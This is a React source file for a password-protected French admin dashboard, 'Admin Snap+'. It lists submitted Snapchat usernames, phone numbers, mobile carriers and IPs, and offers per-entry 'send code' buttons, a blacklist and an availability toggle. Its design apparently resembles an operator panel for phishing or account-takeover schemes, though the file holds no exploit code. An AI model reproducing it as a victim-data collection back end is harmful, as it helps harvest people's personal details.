import { useQuery, useQueryClient } from "@tanstack/react-query";
import { base44 } from "@/api/base44Client";
import { motion } from "framer-motion";
import { useEffect, useState } from "react";
import { Lock, Shield, Ban, Send, Check, Phone, Ghost, Activity, Power, X } from "lucide-react";

const operatorBadge = {
  SFR: "bg-red-500/15 text-red-400 border-red-500/30",
  Bouygues: "bg-blue-500/15 text-blue-400 border-blue-500/30",
  Orange: "bg-orange-400/15 text-orange-400 border-orange-400/30",
};

const operatorAccent = {
  SFR: "from-red-500/20",
  Bouygues: "from-blue-500/20",
  Orange: "from-orange-400/20",
};

function PasswordGate({ onUnlock }) {
  const [input, setInput] = useState("");
  const [error, setError] = useState("");
  const [locked, setLocked] = useState(false);
  const [remaining, setRemaining] = useState(0);

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const res = await base44.functions.invoke("verifyAdminPassword", { password: input });
      if (res?.data?.ok) {
        base44.functions.invoke("notifyAdminLogin", {}).catch(() => {});
        onUnlock();
      } else if (res?.data?.locked) {
        setLocked(true);
        setRemaining(res.data.remaining);
        setInput("");
      } else {
        const left = res?.data?.attemptsLeft;
        setError(left > 0 ? `Mot de passe incorrect — ${left} tentative(s) restante(s)` : "Mot de passe incorrect");
        setInput("");
        setTimeout(() => setError(""), 3000);
      }
    } catch (err) {
      if (err?.response?.data?.locked) {
        setLocked(true);
        setRemaining(err.response.data.remaining);
      } else {
        setError("Mot de passe incorrect");
        setInput("");
        setTimeout(() => setError(""), 3000);
      }
    }
  };

  return (
    <div className="min-h-screen bg-background flex items-center justify-center px-4 relative overflow-hidden">
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[500px] h-[500px] bg-primary/10 rounded-full blur-[140px] pointer-events-none" />
      <motion.div
        initial={{ opacity: 0, y: 24 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5 }}
        className="relative z-10 bg-card border border-border rounded-3xl px-8 py-10 w-full max-w-sm shadow-2xl shadow-black/50 text-center"
      >
        <div className="w-16 h-16 bg-primary/10 border border-primary/30 rounded-2xl flex items-center justify-center mx-auto mb-5">
          <Lock className="w-7 h-7 text-primary" />
        </div>
        <h1 className="font-heading text-2xl font-bold text-foreground mb-1">Accès Admin</h1>
        <p className="text-muted-foreground text-sm mb-6">Entrez le mot de passe pour continuer</p>
        {locked ? (
          <div className="bg-destructive/10 border border-destructive/30 rounded-xl px-4 py-5 text-center">
            <Ban className="w-6 h-6 text-destructive mx-auto mb-2" />
            <p className="text-destructive font-bold text-sm mb-1">Accès bloqué</p>
            <p className="text-muted-foreground text-xs">Trop de tentatives échouées. Réessayez dans <span className="text-destructive font-semibold">{remaining} min</span>.</p>
          </div>
        ) : (
          <form onSubmit={handleSubmit} className="space-y-4">
            <input
              type="password"
              placeholder="Mot de passe"
              value={input}
              onChange={(e) => setInput(e.target.value)}
              className={`w-full bg-background border rounded-xl px-4 py-3 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/40 transition-all text-sm ${
                error ? "border-destructive ring-2 ring-destructive/40" : "border-border"
              }`}
              autoFocus
            />
            {error && <p className="text-destructive text-xs">{error}</p>}
            <button
              type="submit"
              className="w-full bg-primary text-primary-foreground font-bold py-3 rounded-xl text-sm hover:bg-primary/80 transition-colors shadow-lg shadow-primary/20"
            >
              Accéder au dashboard
            </button>
          </form>
        )}
      </motion.div>
    </div>
  );
}

export default function Admin() {
  const [unlocked, setUnlocked] = useState(false);
  const queryClient = useQueryClient();
  const [sendingId, setSendingId] = useState(null);
  const [sentIds, setSentIds] = useState([]);
  const [showBlacklist, setShowBlacklist] = useState(false);
  const [blacklistInput, setBlacklistInput] = useState("");
  const [adminInactive, setAdminInactive] = useState(false);
  const [actionSuccess, setActionSuccess] = useState(false);

  const { data: submissions = [], isLoading } = useQuery({
    queryKey: ["submissions"],
    queryFn: () => base44.entities.Submission.list("-created_date", 999999),
    enabled: unlocked,
  });

  const { data: blacklist = [] } = useQuery({
    queryKey: ["blacklist"],
    queryFn: () => base44.entities.BlacklistEntry.list(),
    enabled: unlocked,
  });

  useEffect(() => {
    if (!unlocked) return;
    
    base44.functions.invoke("checkAdminStatus", {})
      .then(res => setAdminInactive(res?.data?.is_inactive || false))
      .catch(() => {});
    
    const params = new URLSearchParams(window.location.search);
    const triggerId = params.get("trigger") || (params.get("action") === "send_code" ? params.get("id") : null);
    if (triggerId) handleSendCode(triggerId);
  }, [unlocked]);

  const handleSendCode = async (id) => {
    setSendingId(id);
    let success = false;
    for (let attempt = 0; attempt < 3; attempt++) {
      try {
        await base44.functions.invoke("sendCode", { submissionId: id, action: "code_ready" });
        success = true;
        break;
      } catch {
        if (attempt < 2) await new Promise(r => setTimeout(r, 1000));
      }
    }
    if (success) {
      setSentIds((prev) => [...prev, id]);
      queryClient.invalidateQueries(["submissions"]);
      setActionSuccess(true);
      setTimeout(() => setActionSuccess(false), 3000);
    }
    setSendingId(null);
  };

  const stats = {
    total: submissions.length,
    SFR: submissions.filter((s) => s.operateur === "SFR").length,
    Bouygues: submissions.filter((s) => s.operateur === "Bouygues").length,
    Orange: submissions.filter((s) => s.operateur === "Orange").length,
  };

  const addToBlacklist = async () => {
    if (!blacklistInput.trim()) return;
    const type = /^\d+$/.test(blacklistInput.trim()) ? "phone" : "ip";
    await base44.entities.BlacklistEntry.create({ value: blacklistInput.trim(), type });
    queryClient.invalidateQueries({ queryKey: ["blacklist"] });
    setBlacklistInput("");
  };

  const removeFromBlacklist = async (entryId) => {
    await base44.entities.BlacklistEntry.delete(entryId);
    queryClient.invalidateQueries({ queryKey: ["blacklist"] });
  };

  const toggleAdminStatus = async () => {
    await base44.functions.invoke("toggleAdminStatus", { is_inactive: !adminInactive });
    setAdminInactive(!adminInactive);
  };

  const isBlacklisted = (sub) => {
    return blacklist.some(item => 
      (item.type === "phone" && sub.telephone === item.value) ||
      (item.type === "ip" && sub.ip_address === item.value)
    );
  };

  if (!unlocked) return <PasswordGate onUnlock={() => setUnlocked(true)} />;

  if (actionSuccess) return (
    <div className="min-h-screen bg-background flex items-center justify-center px-4 relative overflow-hidden">
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[500px] h-[500px] bg-green-500/10 rounded-full blur-[140px] pointer-events-none" />
      <motion.div
        initial={{ opacity: 0, scale: 0.9 }}
        animate={{ opacity: 1, scale: 1 }}
        className="relative z-10 bg-card border border-border rounded-3xl px-10 py-14 text-center shadow-2xl shadow-black/50 max-w-sm w-full"
      >
        <div className="w-16 h-16 bg-green-500/15 border border-green-500/30 rounded-2xl flex items-center justify-center mx-auto mb-5">
          <Check className="w-8 h-8 text-green-400" />
        </div>
        <h2 className="font-heading text-2xl font-bold text-foreground mb-2">Action effectuée</h2>
        <p className="text-muted-foreground text-sm">Le statut de l'utilisateur a bien été mis à jour.</p>
      </motion.div>
    </div>
  );

  const statCards = [
    { label: "Total", value: stats.total, color: "text-primary", icon: Activity },
    { label: "SFR", value: stats.SFR, color: "text-red-400", icon: Phone },
    { label: "Bouygues", value: stats.Bouygues, color: "text-blue-400", icon: Phone },
    { label: "Orange", value: stats.Orange, color: "text-orange-400", icon: Phone },
  ];

  return (
    <div className="min-h-screen bg-background px-4 py-8 md:py-10 relative overflow-hidden">
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-[700px] h-[400px] bg-primary/8 rounded-full blur-[150px] pointer-events-none" />
      <div className="max-w-5xl mx-auto relative z-10">
        <motion.div
          initial={{ opacity: 0, y: 16 }}
          animate={{ opacity: 1, y: 0 }}
          className="mb-8 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4"
        >
          <div className="flex items-center gap-3">
            <div className="w-11 h-11 bg-primary/10 border border-primary/30 rounded-2xl flex items-center justify-center">
              <Shield className="w-6 h-6 text-primary" />
            </div>
            <div>
              <h1 className="font-heading text-2xl md:text-3xl font-bold text-foreground leading-tight">
                Admin <span className="text-primary">Snap+</span>
              </h1>
              <p className="text-muted-foreground text-xs md:text-sm mt-0.5">Toutes les soumissions reçues</p>
            </div>
          </div>
          <div className="flex gap-2 flex-wrap">
            <button
              onClick={toggleAdminStatus}
              className={`inline-flex items-center gap-1.5 px-3.5 py-2 rounded-xl text-xs font-bold transition-colors border ${
                adminInactive
                  ? "bg-orange-500/15 text-orange-400 border-orange-500/40 hover:bg-orange-500/25"
                  : "bg-green-500/15 text-green-400 border-green-500/40 hover:bg-green-500/25"
              }`}
            >
              <Power className="w-3.5 h-3.5" />
              {adminInactive ? "Absent" : "Actif"}
            </button>
            <button
              onClick={() => setShowBlacklist(!showBlacklist)}
              className="inline-flex items-center gap-1.5 bg-destructive/15 text-destructive border border-destructive/40 px-3.5 py-2 rounded-xl text-xs font-bold hover:bg-destructive/25 transition-colors"
            >
              <Ban className="w-3.5 h-3.5" />
              Blacklist ({blacklist.length})
            </button>
          </div>
        </motion.div>

        {showBlacklist && (
          <motion.div
            initial={{ opacity: 0, y: -10 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-destructive/10 border border-destructive/30 rounded-2xl p-4 mb-6"
          >
            <h3 className="text-sm font-bold text-destructive mb-3 flex items-center gap-2">
              <Ban className="w-4 h-4" /> Gérer la Blacklist
            </h3>
            <div className="flex gap-2 mb-3">
              <input
                type="text"
                placeholder="Numéro (07...) ou IP"
                value={blacklistInput}
                onChange={(e) => setBlacklistInput(e.target.value)}
                className="flex-1 bg-background border border-border rounded-lg px-3 py-2 text-xs focus:outline-none focus:ring-2 focus:ring-destructive/40"
              />
              <button
                onClick={addToBlacklist}
                className="bg-destructive text-destructive-foreground px-4 py-2 rounded-lg text-xs font-bold hover:bg-destructive/80 transition-colors"
              >
                Ajouter
              </button>
            </div>
            <div className="space-y-1.5 max-h-40 overflow-y-auto">
              {blacklist.length === 0 ? (
                <p className="text-muted-foreground text-xs text-center py-3">Aucune entrée blacklistée</p>
              ) : blacklist.map((item) => (
                <div key={item.id} className="flex justify-between items-center bg-background p-2.5 rounded-lg text-xs border border-border/50">
                  <span className="flex items-center gap-2 text-foreground/80">
                    <span className="text-muted-foreground">{item.type === "phone" ? "📞" : "🌐"}</span>
                    <span className="font-mono">{item.value}</span>
                  </span>
                  <button
                    onClick={() => removeFromBlacklist(item.id)}
                    className="text-destructive hover:text-destructive/70 transition-colors"
                  >
                    <X className="w-3.5 h-3.5" />
                  </button>
                </div>
              ))}
            </div>
          </motion.div>
        )}

        <div className="grid grid-cols-2 md:grid-cols-4 gap-3 md:gap-4 mb-8">
          {statCards.map((stat, i) => {
            const Icon = stat.icon;
            return (
              <motion.div
                key={stat.label}
                initial={{ opacity: 0, y: 16 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: i * 0.07 }}
                className="relative bg-card border border-border rounded-2xl p-5 overflow-hidden"
              >
                <div className="absolute -top-8 -right-8 w-24 h-24 bg-primary/5 rounded-full blur-2xl pointer-events-none" />
                <div className="relative flex items-center justify-between mb-3">
                  <div className="w-9 h-9 rounded-xl bg-muted/50 border border-border flex items-center justify-center">
                    <Icon className={`w-4 h-4 ${stat.color}`} />
                  </div>
                </div>
                <div className={`font-heading text-3xl font-bold ${stat.color}`}>{stat.value}</div>
                <div className="text-muted-foreground text-[11px] mt-1 font-semibold uppercase tracking-wide">{stat.label}</div>
              </motion.div>
            );
          })}
        </div>

        <motion.div
          initial={{ opacity: 0, y: 16 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-card border border-border rounded-2xl overflow-hidden shadow-xl shadow-black/30"
        >
          {isLoading ? (
            <div className="flex items-center justify-center py-20">
              <div className="w-8 h-8 border-2 border-primary/30 border-t-primary rounded-full animate-spin" />
            </div>
          ) : submissions.length === 0 ? (
            <div className="text-center py-20">
              <Ghost className="w-12 h-12 text-muted-foreground/40 mx-auto mb-4" />
              <p className="text-muted-foreground text-sm">Aucune soumission pour l'instant</p>
            </div>
          ) : (
            <div className="overflow-x-auto max-h-[32rem] overflow-y-auto">
              <table className="w-full text-sm table-fixed min-w-[640px]">
                <colgroup>
                  <col className="w-[6%]" />
                  <col className="w-[24%]" />
                  <col className="w-[20%]" />
                  <col className="w-[14%]" />
                  <col className="w-[18%]" />
                  <col className="w-[18%]" />
                </colgroup>
                <thead>
                  <tr className="border-b border-border bg-muted/40">
                    <th className="text-left px-4 py-3.5 text-[11px] font-semibold uppercase tracking-wider text-muted-foreground">#</th>
                    <th className="text-left px-4 py-3.5 text-[11px] font-semibold uppercase tracking-wider text-muted-foreground">Snapchat</th>
                    <th className="text-left px-4 py-3.5 text-[11px] font-semibold uppercase tracking-wider text-muted-foreground">Téléphone</th>
                    <th className="text-left px-4 py-3.5 text-[11px] font-semibold uppercase tracking-wider text-muted-foreground">Opérateur</th>
                    <th className="text-left px-4 py-3.5 text-[11px] font-semibold uppercase tracking-wider text-muted-foreground">Date</th>
                    <th className="text-left px-4 py-3.5 text-[11px] font-semibold uppercase tracking-wider text-muted-foreground">Action</th>
                  </tr>
                </thead>
                <tbody>
                  {submissions.map((sub, i) => {
                    const isSent = sentIds.includes(sub.id) || sub.status === "code_ready";
                    const isSending = sendingId === sub.id;
                    const blacklisted = isBlacklisted(sub);
                    return (
                      <motion.tr
                        key={sub.id}
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        transition={{ delay: Math.min(i * 0.02, 0.4) }}
                        className={`border-b border-border/50 hover:bg-muted/20 transition-colors ${blacklisted ? "bg-destructive/10 opacity-60" : ""}`}
                      >
                        <td className="px-4 py-3.5 text-muted-foreground text-sm font-mono">{i + 1}</td>
                        <td className="px-4 py-3.5">
                          <div className="flex items-center gap-2 text-sm font-semibold text-foreground truncate">
                            <Ghost className="w-4 h-4 text-muted-foreground/60 flex-shrink-0" />
                            <span className="truncate">{sub.snapchat}</span>
                          </div>
                        </td>
                        <td className="px-4 py-3.5">
                          <div className="flex items-center gap-2 text-sm text-foreground font-mono">
                            <span className="truncate">{sub.telephone}</span>
                            {blacklisted && <Ban className="w-3.5 h-3.5 text-destructive flex-shrink-0" />}
                          </div>
                        </td>
                        <td className="px-4 py-3.5">
                          <span className={`inline-flex items-center px-2.5 py-1 rounded-full border text-[11px] font-bold tracking-wide whitespace-nowrap ${operatorBadge[sub.operateur]}`}>
                            {sub.operateur}
                          </span>
                        </td>
                        <td className="px-4 py-3.5 text-xs text-muted-foreground whitespace-nowrap">
                          {new Date(sub.created_date).toLocaleDateString("fr-FR", {
                            day: "2-digit", month: "short", year: "numeric",
                            hour: "2-digit", minute: "2-digit",
                          })}
                        </td>
                        <td className="px-4 py-3.5">
                          {isSent ? (
                            <span className="inline-flex items-center gap-1.5 text-green-400 text-xs font-semibold">
                              <Check className="w-4 h-4" /> Code envoyé
                            </span>
                          ) : isSending ? (
                            <span className="inline-flex items-center gap-2 text-muted-foreground text-xs font-semibold">
                              <span className="w-3.5 h-3.5 border-2 border-primary/30 border-t-primary rounded-full animate-spin" />
                              Envoi...
                            </span>
                          ) : (
                            <button
                              onClick={() => handleSendCode(sub.id)}
                              disabled={isSending}
                              className="inline-flex items-center gap-1.5 bg-primary text-primary-foreground text-xs font-bold px-3.5 py-2 rounded-lg hover:bg-primary/80 transition-colors disabled:opacity-50 whitespace-nowrap"
                            >
                              <Send className="w-3.5 h-3.5" />
                              Envoyer le code
                            </button>
                          )}
                        </td>
                      </motion.tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          )}
        </motion.div>
      </div>
    </div>
  );
}